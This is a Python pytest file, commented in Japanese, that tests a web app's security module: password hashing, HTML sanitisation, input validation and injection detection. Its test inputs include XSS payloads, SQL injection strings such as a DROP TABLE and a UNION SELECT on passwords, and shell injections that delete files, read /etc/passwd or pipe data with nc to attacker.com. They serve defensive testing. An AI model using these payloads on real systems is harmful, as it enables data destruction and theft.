"""
セキュリティモジュールのテスト
"""

import pytest
from modules.security import (
    hash_password, verify_password,
    sanitize_html, validate_username, validate_email,
    validate_password, check_injection_attempt
)


@pytest.mark.unit
class TestPasswordHashing:
    """パスワードハッシング機能のテスト"""
    
    def test_hash_password_success(self):
        """パスワードが正常にハッシュされるか"""
        password = "SecurePass123"
        hashed = hash_password(password)
        
        assert hashed is not None
        assert len(hashed) > 20  # bcrypt ハッシュ
        assert hashed != password  # ハッシュ化されている
    
    def test_hash_password_different_each_time(self):
        """同じパスワードでも毎回異なるハッシュが生成されるか"""
        password = "SecurePass123"
        hash1 = hash_password(password)
        hash2 = hash_password(password)
        
        assert hash1 != hash2
    
    def test_verify_password_correct(self):
        """正しいパスワードが検証されるか"""
        password = "SecurePass123"
        hashed = hash_password(password)
        
        assert verify_password(password, hashed) is True
    
    def test_verify_password_incorrect(self):
        """間違ったパスワードが検証されないか"""
        password = "SecurePass123"
        wrong_password = "WrongPassword456"
        hashed = hash_password(password)
        
        assert verify_password(wrong_password, hashed) is False
    
    def test_verify_password_empty(self):
        """空のパスワードが検証されないか"""
        hashed = hash_password("SecurePass123")
        assert verify_password("", hashed) is False


@pytest.mark.security
class TestHTMLSanitization:
    """HTML サニタイズ機能のテスト"""
    
    def test_sanitize_xss_script_tag(self):
        """XSS スクリプトが無効化されるか"""
        xss_input = '<script>alert("XSS")</script>'
        result = sanitize_html(xss_input)
        
        assert '<script>' not in result
        assert 'alert' in result  # テキストは保持
    
    def test_sanitize_html_entities(self):
        """HTML エンティティが正しくエスケープされるか"""
        html_input = '<div>Hello & goodbye</div>'
        result = sanitize_html(html_input)
        
        assert '&lt;' in result or '<' not in result
        assert '&amp;' in result or '&' not in result
    
    def test_sanitize_onclick_event(self):
        """onclick イベント属性が無効化されるか"""
        html_input = '<img src="x" onclick="alert(\'XSS\')">'
        result = sanitize_html(html_input)
        
        assert 'onclick' not in result
    
    def test_sanitize_normal_text(self):
        """通常のテキストは保持されるか"""
        normal_text = "Hello World 123"
        result = sanitize_html(normal_text)
        
        assert result == normal_text


@pytest.mark.unit
class TestUsernameValidation:
    """ユーザー名検証のテスト"""
    
    def test_valid_username(self):
        """正規の形式のユーザー名が承認されるか"""
        valid_usernames = [
            "user123",
            "john_doe",
            "Alice",
            "test-user"
        ]
        for username in valid_usernames:
            assert validate_username(username) is True
    
    def test_invalid_username_too_short(self):
        """短すぎるユーザー名が拒否されるか"""
        assert validate_username("ab") is False
    
    def test_invalid_username_special_chars(self):
        """特殊文字を含むユーザー名が拒否されるか"""
        assert validate_username("user@name") is False
        assert validate_username("user#123") is False
    
    def test_invalid_username_empty(self):
        """空のユーザー名が拒否されるか"""
        assert validate_username("") is False


@pytest.mark.unit
class TestEmailValidation:
    """メールアドレス検証のテスト"""
    
    def test_valid_email(self):
        """正規のメールアドレスが承認されるか"""
        valid_emails = [
            "user@example.com",
            "john.doe@company.org",
            "test+tag@domain.co.uk"
        ]
        for email in valid_emails:
            assert validate_email(email) is True
    
    def test_invalid_email_no_domain(self):
        """ドメインなしのメールが拒否されるか"""
        assert validate_email("user@localhost") is False
    
    def test_invalid_email_no_at_sign(self):
        """@ がないメールが拒否されるか"""
        assert validate_email("userexample.com") is False
    
    def test_invalid_email_empty(self):
        """空のメールが拒否されるか"""
        assert validate_email("") is False


@pytest.mark.security
class TestPasswordValidation:
    """パスワード強度検証のテスト"""
    
    def test_strong_password(self):
        """強いパスワードが承認されるか"""
        strong_passwords = [
            "SecurePass123",
            "MyP@ssw0rd",
            "Abc123Xyz!Pass"
        ]
        for pwd in strong_passwords:
            assert validate_password(pwd) is True
    
    def test_weak_password_too_short(self):
        """短いパスワードが拒否されるか"""
        assert validate_password("Pass1") is False
    
    def test_weak_password_no_uppercase(self):
        """大文字がないパスワードが拒否されるか"""
        assert validate_password("securepass123") is False
    
    def test_weak_password_no_lowercase(self):
        """小文字がないパスワードが拒否されるか"""
        assert validate_password("SECUREPASS123") is False
    
    def test_weak_password_no_digits(self):
        """数字がないパスワードが拒否されるか"""
        assert validate_password("SecurePassword") is False


@pytest.mark.security
class TestInjectionDetection:
    """SQL/コマンド インジェクション検出のテスト"""
    
    def test_sql_injection_detection(self):
        """SQL インジェクションが検出されるか"""
        sql_injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin' --",
            "1' UNION SELECT * FROM passwords --"
        ]
        for injection in sql_injections:
            assert check_injection_attempt(injection) is True
    
    def test_command_injection_detection(self):
        """コマンド インジェクションが検出されるか"""
        cmd_injections = [
            "test; rm -rf /",
            "file.txt && cat /etc/passwd",
            "data | nc attacker.com 1234"
        ]
        for injection in cmd_injections:
            assert check_injection_attempt(injection) is True
    
    def test_normal_input_not_flagged(self):
        """通常の入力が誤検出されないか"""
        normal_inputs = [
            "Hello World",
            "user@example.com",
            "SecurePass123"
        ]
        for input_str in normal_inputs:
            assert check_injection_attempt(input_str) is False


@pytest.mark.unit
class TestSecurityIntegration:
    """セキュリティモジュール統合テスト"""
    
    def test_full_authentication_flow(self, sample_user_data):
        """完全な認証フロー（登録 → パスワード検証）"""
        username = sample_user_data['username']
        password = sample_user_data['password']
        
        # バリデーション
        assert validate_username(username) is True
        assert validate_password(password) is True
        
        # ハッシング
        hashed = hash_password(password)
        assert hashed is not None
        
        # 検証
        assert verify_password(password, hashed) is True
        assert verify_password("wrong", hashed) is False
    
    def test_input_sanitization_and_validation(self):
        """入力のサニタイズと検証"""
        user_input = '<script>alert("XSS")</script>'
        
        # サニタイズ
        sanitized = sanitize_html(user_input)
        
        # サニタイズされた入力をチェック
        assert '<script>' not in sanitized
